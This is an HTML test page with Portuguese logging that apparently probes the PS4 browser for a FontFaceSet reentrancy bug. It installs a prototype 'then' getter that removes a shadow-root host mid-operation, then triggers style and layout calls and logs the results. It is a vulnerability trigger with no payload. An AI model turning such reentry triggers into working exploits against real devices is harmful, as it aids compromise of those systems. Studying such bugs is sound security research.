<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>PS4 FontFaceSet Shadow Root Reentry</title></head>
<body><pre id="log" style="white-space:pre-wrap"></pre>
<script>
(function () {
'use strict';
var out = document.getElementById('log');
var key = 'ps4-shadow-reentry-last';
function log(s) { out.textContent += s + '\n'; try { localStorage.setItem(key, out.textContent); } catch(e) {} }
function show(s) { out.textContent += s + '\n'; }
var previous = null;
try { previous = localStorage.getItem(key); } catch(e) {}
if (previous) { show('--- REGISTRO DA EXECUCAO ANTERIOR ---'); show(previous); show('--- NOVA EXECUCAO ---'); }
log('START ' + new Date().toISOString());
log('FontFaceSet=' + typeof FontFaceSet + ' / document.fonts=' + typeof document.fonts);
if (typeof FontFaceSet !== 'function' || !document.fonts || !document.fonts.ready) { log('ABORT: APIs ausentes'); return; }
var fonts = document.fonts;
log('proto correto=' + (Object.getPrototypeOf(fonts) === FontFaceSet.prototype));
var host = document.createElement('div');
document.body.appendChild(host);
var shadow = host.attachShadow({mode:'open'});
var style = document.createElement('style');
var family = 'PS4Probe' + Date.now();
var fontURL = 'test-font.ttf?run=' + Date.now();
style.textContent = '@font-face{font-family:"' + family + '";src:url("' + fontURL + '") format("truetype");font-weight:normal;} .probe{font:24px "' + family + '";}';
shadow.appendChild(style);
var span = document.createElement('span'); span.className = 'probe'; span.textContent = 'AAAA'; shadow.appendChild(span);
void span.offsetWidth;
log('apos layout status=' + fonts.status);
var loadPromise;
try { loadPromise = fonts.load('24px "' + family + '"', 'AAAA'); log('fonts.load iniciado status=' + fonts.status); }
catch(e) { log('ERRO fonts.load ' + e); return; }
// Materializa a Promise de ready antes de instalar o getter, como no caso original.
var ready = fonts.ready;
var extraStyle = document.createElement('style'); extraStyle.textContent = '.irrelevante{color:blue}'; shadow.insertBefore(extraStyle, shadow.firstChild);
var count = 0;
Object.defineProperty(FontFaceSet.prototype, 'then', {
 configurable:true,
 get:function() {
   delete FontFaceSet.prototype.then;
   count++;
   log('GETTER ENTROU count=' + count + ' status=' + fonts.status + ' hostConnected=' + host.isConnected);
   // OPERACAO CRITICA: altera a colecao de shadow roots enquanto o codigo nativo pode estar iterando.
   host.remove();
   log('GETTER REMOVEU HOST connected=' + host.isConnected);
   return undefined;
 }
});
log('GETTER INSTALADO');
function trigger(name, fn) { log('ANTES '+name+' count='+count); try { fn(); } catch(e) { log('ERRO '+name+' '+e); } log('DEPOIS '+name+' count='+count); }
trigger('document.styleSheets.length', function(){ void document.styleSheets.length; });
trigger('span.offsetWidth', function(){ void span.offsetWidth; });
trigger('getComputedStyle', function(){ void getComputedStyle(span).fontFamily; });
trigger('shadow.styleSheets.length', function(){ void shadow.styleSheets.length; });
// Estes observadores nao resolvem FontFaceSet como valor e nao devem acionar o getter por conta propria.
ready.then(function(){ log('READY RESOLVIDA count='+count+' status='+fonts.status); }, function(e){ log('READY REJEITADA '+e); });
loadPromise.then(function(){ log('LOAD RESOLVIDO count='+count+' status='+fonts.status); }, function(e){ log('LOAD REJEITADO '+e); });
setTimeout(function(){ log('T+250ms status='+fonts.status+' getter='+count); },250);
setTimeout(function(){ log('T+1500ms status='+fonts.status+' getter='+count+' hostConnected='+host.isConnected); },1500);
})();
</script></body></html>
